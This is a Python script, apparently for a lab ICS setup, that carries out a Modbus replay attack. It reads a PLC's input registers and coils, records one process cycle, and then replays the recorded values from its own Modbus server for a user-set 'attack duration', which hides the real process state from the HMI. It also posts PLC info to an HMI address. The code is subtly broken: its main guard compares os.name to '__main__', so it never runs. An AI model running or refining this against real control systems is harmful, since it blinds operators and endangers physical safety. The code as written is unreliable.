#!/usr/bin/env python3 
 
import argparse 
import json
from os import name 
import modbus_tk 
import modbus_tk.defines as cst 
from modbus_tk import modbus_tcp 
from time import time, sleep 
import requests
 
def read_plc_data(master): 
    data = {} 
    try: 
        data['I'] = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 4) 
        data['C'] = master.execute(1, cst.READ_COILS, 0, 3) 
    except: 
        print('Error reading master') 
    return data 
 
def write_plc_data(slave, data): 
    slave.set_values('0', 0, data['I']) 
    slave.set_values('1', 0, data['C']) 
 
def main(): 
    parser = argparse.ArgumentParser() 
    parser.add_argument('--plc', choices=['all', 'single'], default='all', help='PLC selection') 
    parser.add_argument('--ip', nargs='+', help='IP addresses of PLCs') 
    parser.add_argument('--duration', type=int, help='Attack duration in minutes') 
    parser.add_argument('json_files', nargs='+', help='JSON files containing PLC info') 
    args = parser.parse_args() 
 
    if args.plc == 'all': 
        ip_addresses = args.ip if args.ip else ['192.168.20.101', '192.168.20.102', '192.168.20.103'] 
    elif args.plc == 'single': 
        ip_addresses = args.ip if args.ip else ['192.168.20.101'] 
    else: 
        print('Invalid PLC selection') 
        return 
 
    if not args.duration: 
        print('Please provide the attack duration') 
        return 
 
    # Create a TCP master for reading PLC data 
    master = modbus_tcp.TcpMaster(host='127.0.0.1', port=8502) 
    master.set_timeout(5.0) 
 
    # Create a TCP server and slave for writing PLC data 
    server = modbus_tcp.TcpServer(port=9502) 
    server.start() 
    slave = server.add_slave(1) 
    slave.add_block('0', cst.ANALOG_INPUTS, 0, 4) 
    slave.add_block('1', cst.COILS, 0, 3) 
 
    history = [] 
    state = 0 
    i = 0 
 
    # Read JSON files and pass PLC info to HMI 
    for json_file in args.json_files: 
        with open(json_file) as file:        
            plc_info = json.load(file)
            # Pass plc_info to HMI at 192.168.20.104        
            try:
                response = requests.post('http://192.168.20.104', json=plc_info)            
                if response.status_code == 200:
                    print('PLC info sent to HMI successfully')           
                else:
                    print('Error sending PLC info to HMI')       
            except requests.exceptions.RequestException as e:
                print('Error sending PLC info to HMI:', str(e)) 
 
    start_time = time() 
    end_time = start_time + args.duration * 60 
 
    while time() < end_time: 
        print('STATE:', state) 
 
        if state in (0, 1, 2): 
            data = read_plc_data(master) 
 
            print('read:', data) 
 
            v = data['I'][0] 
            if state == 0 and v > 75: 
                state = 1 
            elif state == 1 and v < 60: 
                state = 2 
            elif state == 2 and v > 75: 
                state = 3 
 
            if state in (1, 2): 
                history.append(data) 
 
            v1 = v 
 
        if state == 3: 
            data = history[i % len(history)] 
            i += 1 
 
        write_plc_data(slave, data) 
 
        sleep(0.5) 
 
if name == '__main__': 
    main()

